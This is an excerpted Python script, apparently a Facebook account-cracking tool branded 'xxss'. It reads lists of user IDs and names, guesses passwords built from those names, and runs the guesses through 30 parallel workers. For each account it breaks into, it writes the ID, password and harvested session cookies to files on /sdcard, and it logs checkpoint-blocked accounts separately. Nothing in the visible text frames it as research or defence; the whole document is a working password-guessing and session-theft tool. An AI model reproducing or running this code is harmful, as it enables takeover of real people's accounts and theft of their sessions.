...
sys.stdout.write('\x1b]2; xxss\x07')
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/xxss.txt');linex()
    ...
    def methodA(self, sid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);xxssb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={xxssb};{ckkk}"
                    print(f"\r\r{G1}[xxss-OK] {sid} | {ps} ")
                    open('/sdcard/xxss-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[xxss-CP] {sid} | {ps} ")
                     open('/sdcard/xxss-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);xxssb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={xxssb};{ckkk}"
                    print(f"\r\r{G1}[xxss-OK] {sid} | {ps} ")
                    open('/sdcard/xxss-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[xxss-CP] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with Habib(max_workers=30) as xxssworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                xxssworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                xxssworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[xxss-OK] {uid} | {pas}')
